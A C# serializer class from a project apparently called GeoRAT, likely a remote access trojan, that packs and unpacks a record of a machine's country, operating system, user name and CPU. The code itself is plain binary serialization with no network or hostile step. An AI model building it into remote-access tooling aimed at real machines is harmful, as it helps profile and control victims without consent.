
using System;
using System.IO;
using GeoRAT.Core.Interfaces;

namespace GeoRAT.Core.PacketStruct
{
    //This class implements IPacketSerializer interface and serializes Info class into byte[] array 
    //It also deserializes byte[] array back to Info 
   public class Serializer : IPacketSerializer<Info> 
    {

        public  byte[] Serialize(Info i)
        {
            using (var stream = new MemoryStream())
            {
                using (var writer = new BinaryWriter(stream))
                {
                    writer.Write(i.Country);
                    writer.Write(i.Os);
                    writer.Write(i.UserName);
                    writer.Write(i.Cpu);
                }
                return stream.ToArray();
            }

            
        }

        public Info Deserialize(byte[] buffer)
        {
            var i = new Info();
            using (var stream = new MemoryStream(buffer))
            {
                using (var read = new BinaryReader(stream))
                {
                    i.Country = read.ReadString();
                    i.Os = read.ReadString();
                    i.UserName = read.ReadString();
                    i.Cpu = read.ReadString();

                }
            }
            return i;
        }

       
    }
}
